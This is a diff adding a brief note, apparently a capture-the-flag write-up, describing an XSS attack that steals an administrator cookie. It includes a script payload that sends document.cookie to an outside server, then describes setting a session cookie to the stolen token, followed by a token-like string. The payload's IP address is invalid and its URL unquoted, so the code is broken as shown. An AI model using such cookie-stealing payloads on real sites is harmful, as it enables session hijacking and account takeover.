@@ -1,0 +1,11 @@
+WOW that was hard
+
+
+We need an XSS attack with a callback to our server
+
+<script> fetch(http://87.138.287.487:786, {method: "POST", body: JSON.stringify(document.cookie)})</script>
+
+
+Then, once we get our adminastrator cookie, I set deposit_user cookie to that token.
+
+32f35nh98gf3hy9085g398g35y98f43h9f3g234f27w624
